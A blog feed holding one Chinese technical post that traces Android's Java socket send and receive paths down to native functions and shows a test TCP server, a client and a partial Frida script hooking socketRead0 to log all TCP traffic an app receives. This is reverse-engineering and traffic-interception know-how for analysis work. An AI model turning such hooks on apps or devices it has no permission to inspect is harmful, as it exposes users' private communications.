<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>打渔为生</title>
  
  <subtitle>tutucoo的技术笔记</subtitle>
  <link href="https://tutucoo.github.io/atom.xml" rel="self"/>
  
  <link href="https://tutucoo.github.io/"/>
  <updated>2021-11-04T09:57:50.554Z</updated>
  <id>https://tutucoo.github.io/</id>
  
  <author>
    <name>tutucoo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java层Socket溯源与Hook</title>
    <link href="https://tutucoo.github.io/2021/11/04/Java%E5%B1%82Socket%E6%BA%AF%E6%BA%90%E4%B8%8EHook/"/>
    <id>https://tutucoo.github.io/2021/11/04/Java%E5%B1%82Socket%E6%BA%AF%E6%BA%90%E4%B8%8EHook/</id>
    <published>2021-11-04T09:54:57.000Z</published>
    <updated>2021-11-04T09:57:50.554Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java层socket溯源"><a href="#Java层socket溯源" class="headerlink" title="Java层socket溯源"></a>J<strong>ava层socket溯源</strong></h1><p>可以通过AS动态调试进行溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.net.Socket类构造函数: new Socket(ip,port);-&gt;Socket(InetAddress[] addresses,int port,SocketAddress localAddr,boolean stream)&gt;impl-&gt;java.net.SocksSocketImpl-&gt;</span><br><span class="line"></span><br><span class="line">建立连接：connect(SocketAddress endpoint)</span><br><span class="line"></span><br><span class="line">接收数据：java.net.SocketInputStream.read(byte[])-&gt;read(b,0,b.length)-&gt;read(b,off,length,impl.getTimeout())-&gt;socketRead(fd, b, off, length, timeout);(native) </span><br><span class="line"></span><br><span class="line">发送数据: java.net.SocketOutputStream.write(byte[])-&gt;socketWrite(b,0,b.length)-&gt;socketWrite0(fd,b,off,len)</span><br></pre></td></tr></table></figure><p>接收数据的read函数所在的类是一个虚类，那么就有一个实现的类，可以动态调试时看这个对象的shadow$_klass的值，这个值就是它的实现类，这里的值是java.net.SocketInputStream，再通过查看源码找到这个类的具体实现</p><p>可以看到接收数据调用read函数后，最终会调用socketRead0函数，这个函数是native层的函数，只要对这个函数进行hook就可以拦截所有的tcp流量</p><p><img src="https://i.loli.net/2021/11/04/V79YrByHfgeLUMt.png" alt="Untitled"></p><p>有些情况是通过udp进行通信的，比如说http/2就是通过发送udp请求进行通信的</p><p>发送数据，源码函数位于java.net.DatagramSocket.send</p><p><img src="https://i.loli.net/2021/11/04/YMtnd2KG8bToE1u.png" alt="Untitled"></p><p>send内部调用了getImpl.send函数</p><p><img src="https://i.loli.net/2021/11/04/d8tMnQOh24AEL6s.png" alt="Untitled"></p><p>getImpl函数的作用是获取实例，通过这个实例来执行send</p><p>getImpl内部调用了createImpl函数</p><p><img src="https://i.loli.net/2021/11/04/FzEwICj6gd7QUp8.png" alt="Untitled"></p><p>通过动态调试知道获取的实例是PlainDatagramSocketImpl</p><p><img src="https://i.loli.net/2021/11/04/ozyZFJVcAKRgj8f.png" alt="Untitled"></p><p>找到PlainDatagramSocketImpl.send的实现，内部调用了IoBridge.sendto</p><p><img src="https://i.loli.net/2021/11/04/p98cVdLWPMIOqlv.png" alt="Untitled"></p><p>再进入内部是Libcore.os.sendto</p><p><img src="https://i.loli.net/2021/11/04/YlympP8UOCzB7Qb.png" alt="Untitled"></p><p>这里直接跳转sendto，找不到正确的位置，需要先找到Libcore类</p><p>Libcore类的内部有个os变量，属于BlockGuardOs类</p><p><img src="https://i.loli.net/2021/11/04/KFmoXaQTVRfHvn7.png" alt="Untitled"></p><p>进入BlockGuardOs类找到sendto</p><p><img src="https://i.loli.net/2021/11/04/S1lCjbFiUkqm8tL.png" alt="Untitled"></p><p>这里可以看到通过os调用的sendto，os是在BlockGuardOs初始化时传入的，是在父类中进行处理的</p><p><img src="https://i.loli.net/2021/11/04/TBQKIeZ5D4iwqCX.png" alt="Untitled"></p><p>os属于Os类</p><p><img src="https://i.loli.net/2021/11/04/1XVQZgOWenpPJLo.png" alt="Untitled"></p><p>Os类有sendto接口</p><p><img src="https://i.loli.net/2021/11/04/O3tQYZiA1d8qaJB.png" alt="Untitled"></p><p>通过搜索sendto，找到Linux.java</p><p><img src="https://i.loli.net/2021/11/04/6xDSikNloyWbQGu.png" alt="Untitled"></p><p>这样就找到了这个函数的实现，最终调用了native层的setntoBytes</p><p><img src="https://i.loli.net/2021/11/04/9gJW4NTm5pvVM3O.png" alt="Untitled"></p><p>接收数据，跟发送数据类似，找到DatagramSocket的receive函数，内部调用了getImpl</p><p><img src="https://i.loli.net/2021/11/04/uhMNUxABGc5X2yz.png" alt="Untitled"></p><p>通过动态调试获取到PlainDatagramSocketImp，找到receive函数，内部调用了doRecv</p><p><img src="https://i.loli.net/2021/11/04/aubsVve96oqWHkP.png" alt="Untitled"></p><p>doRecv内部调用了IoBridge.recvfrom</p><p><img src="https://i.loli.net/2021/11/04/iv6O4jC1Bhl9JYe.png" alt="Untitled"></p><p>然后找到Libcore.os.recvfrom</p><p><img src="https://i.loli.net/2021/11/04/AXuhE8lOmStMDdC.png" alt="Untitled"></p><p>直接搜索recvfrom可以看到在Linux.java中有实现，找到最终的函数recvfromBytes</p><p><img src="https://i.loli.net/2021/11/04/pNMZfoE5hV7QqBl.png" alt="Untitled"></p><h1 id="hook-Java层tcp-socket接口"><a href="#hook-Java层tcp-socket接口" class="headerlink" title="hook Java层tcp socket接口"></a>hook Java层tcp socket接口</h1><p>运行tcp服务器和客户端，方便进行测试</p><p>服务端</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">socket_list = []</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">s.listen()</span><br><span class="line">def read_from_client(s):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    except:</span><br><span class="line">        socket_list.remove(s)</span><br><span class="line">def server_target(s):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            content = read_from_client(s)</span><br><span class="line">            <span class="keyword">if</span> content is None:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            length=len(content)</span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">0</span>:</span><br><span class="line">                print(<span class="string">&quot;receive:&quot;</span>+content)</span><br><span class="line">                response=content+<span class="string">&quot; from server&quot;</span></span><br><span class="line">                print(<span class="string">&quot;send:&quot;</span>+response)</span><br><span class="line">                s.send(response.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    except IOError <span class="keyword">as</span> e:</span><br><span class="line">        print(e.strerror)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    c, addr = s.accept() </span><br><span class="line">    socket_list.append(c)</span><br><span class="line">    threading.Thread(target=server_target, args=(c,)).start()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">TcpClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="built_in">String</span> ip = <span class="string">&quot;192.168.18.244&quot;</span>;</span><br><span class="line">    public <span class="keyword">static</span> int port = <span class="number">9999</span>;</span><br><span class="line">    public <span class="keyword">static</span> boolean connected = <span class="literal">false</span>;</span><br><span class="line">    public <span class="keyword">static</span> Socket socket = <span class="literal">null</span>;</span><br><span class="line">    public <span class="keyword">static</span> OutputStream outputstream = <span class="literal">null</span>;</span><br><span class="line">    public <span class="keyword">static</span> InputStream inputStream = <span class="literal">null</span>;</span><br><span class="line">    public <span class="keyword">static</span> long lastheartresponse = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">start</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        servicethread();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> Long <span class="function"><span class="title">getTimestamp</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">Date</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == date) &#123;</span><br><span class="line">            <span class="keyword">return</span> (long) <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">String</span> timestamp = <span class="built_in">String</span>.valueOf(date.getTime());</span><br><span class="line">        <span class="keyword">return</span> Long.valueOf(timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">close</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">                socket.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream = <span class="literal">null</span>;</span><br><span class="line">        outputstream = <span class="literal">null</span>;</span><br><span class="line">        connected = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">sendmsg</span>(<span class="params">final <span class="built_in">String</span> msg</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="function"><span class="title">Runnable</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> <span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (connected == <span class="literal">false</span>) &#123;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (outputstream != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="built_in">String</span> crypt = msg;</span><br><span class="line">                            outputstream.write(crypt.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">                            outputstream.flush();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        close();</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">heartthread</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="function"><span class="title">Runnable</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> <span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    long currenttime = getTimestamp();</span><br><span class="line">                    <span class="keyword">if</span> (lastheartresponse != <span class="number">0</span>) &#123;</span><br><span class="line">                        long offset = currenttime - lastheartresponse;</span><br><span class="line">                        int seconds = (int) (offset / <span class="number">1000</span>);</span><br><span class="line">                        <span class="keyword">if</span> (seconds &gt; <span class="number">10</span>) &#123;</span><br><span class="line">                            close();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">5000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">receivethread</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="function"><span class="title">Runnable</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> <span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                int arraysize = <span class="number">1024</span>;</span><br><span class="line">                byte[] content = <span class="keyword">new</span> byte[arraysize];</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            int count = inputStream.read(content);</span><br><span class="line">                            <span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; count &lt; arraysize) &#123;</span><br><span class="line">                                byte[] tmparray = <span class="keyword">new</span> byte[count];</span><br><span class="line">                                System.arraycopy(content, <span class="number">0</span>, tmparray, <span class="number">0</span>, count);</span><br><span class="line">                                <span class="built_in">String</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(tmparray, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            close();</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        close();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="function"><span class="title">servicethread</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> <span class="function"><span class="title">Runnable</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public <span class="keyword">void</span> <span class="function"><span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                heartthread();</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (connected == <span class="literal">false</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            socket = <span class="keyword">new</span> Socket(ip, port);</span><br><span class="line">                            socket.setSoTimeout(<span class="number">10</span>*<span class="number">1000</span>);</span><br><span class="line">                            connected = <span class="literal">true</span>;</span><br><span class="line">                            outputstream = socket.getOutputStream();</span><br><span class="line">                            inputStream = socket.getInputStream();</span><br><span class="line">                            receivethread();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            connected = <span class="literal">false</span>;</span><br><span class="line">                            socket = <span class="literal">null</span>;</span><br><span class="line">                            outputstream = <span class="literal">null</span>;</span><br><span class="line">                            inputStream = <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (outputstream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            JSONObject object = <span class="keyword">new</span> JSONObject();</span><br><span class="line">                            object.put(<span class="string">&quot;msgtype&quot;</span>, <span class="string">&quot;tutucoo&quot;</span>);</span><br><span class="line">                            sendmsg(object.toString());</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">5000</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在AndroidManifest.xml文件中添加权限 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在MainActivity中启动客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TcpClient.start();</span><br></pre></td></tr></table></figure><p>frida脚本如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LogPrint</span>(<span class="params">log</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> theDate = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> hour = theDate.getHours();</span><br><span class="line">    <span class="keyword">var</span> minute = theDate.getMinutes();</span><br><span class="line">    <span class="keyword">var</span> second = theDate.getSeconds();</span><br><span class="line">    <span class="keyword">var</span> mSecond = theDate.getMilliseconds();</span><br><span class="line"></span><br><span class="line">    hour &lt; <span class="number">10</span> ? hour = <span class="string">&quot;0&quot;</span> + hour : hour;</span><br><span class="line">    minute &lt; <span class="number">10</span> ? minute = <span class="string">&quot;0&quot;</span> + minute : minute;</span><br><span class="line">    second &lt; <span class="number">10</span> ? second = <span class="string">&quot;0&quot;</span> + second : second;</span><br><span class="line">    mSecond &lt; <span class="number">10</span> ? mSecond = <span class="string">&quot;00&quot;</span> + mSecond : mSecond &lt; <span class="number">100</span> ? mSecond = <span class="string">&quot;0&quot;</span> + mSecond : mSecond;</span><br><span class="line">    <span class="keyword">var</span> time = hour + <span class="string">&quot;:&quot;</span> + minute + <span class="string">&quot;:&quot;</span> + second + <span class="string">&quot;:&quot;</span> + mSecond;</span><br><span class="line">    <span class="keyword">var</span> threadid = Process.getCurrentThreadId();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[&quot;</span> + time + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;-&gt;threadid:&quot;</span> + threadid + <span class="string">&quot;--&quot;</span> + log);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printJavaStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">&quot; \n &quot;</span>);</span><br><span class="line">            LogPrint(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            LogPrint(replaceStr);</span><br><span class="line">            LogPrint(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end======================= \n &quot;</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isprintable</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">32</span> &amp;&amp; value &lt;= <span class="number">126</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hooktcp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> SocketClass = Java.use(<span class="string">&#x27;java.net.Socket&#x27;</span>);</span><br><span class="line"><span class="comment">//构造函数的参数分别是ip和port</span></span><br><span class="line">        SocketClass.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[&quot;</span> + Process.getCurrentThreadId() + <span class="string">&quot;]new Socket connection:&quot;</span> + arg0 + <span class="string">&quot;,port:&quot;</span> + arg1);</span><br><span class="line">            printJavaStack(<span class="string">&#x27;tcp connect...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.$init(arg0, arg1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> SocketInputStreamClass = Java.use(<span class="string">&#x27;java.net.SocketInputStream&#x27;</span>);</span><br><span class="line">        SocketInputStreamClass.socketRead0.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg0, arg1, arg2, arg3, arg4</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="built_in">this</span>.socketRead0(arg0, arg1, arg2, arg3, arg4);</span><br><span class="line">            <span class="keyword">var</span> bytearray = Java.array(<span class="string">&#x27;byte&#x27;</span>, arg1);</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isprintable(bytearray[i])) &#123;</span><br><span class="line">                    content = content + <span class="built_in">String</span>.fromCharCode(bytearray[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> socketimpl = <span class="built_in">this</span>.impl.value;</span><br><span class="line">            <span class="keyword">var</span> address = socketimpl.address.value;</span><br><span class="line">            <span class="keyword">var</span> port = socketimpl.port.value;</span><br><span class="line"><span class="comment">//ip、port、内容 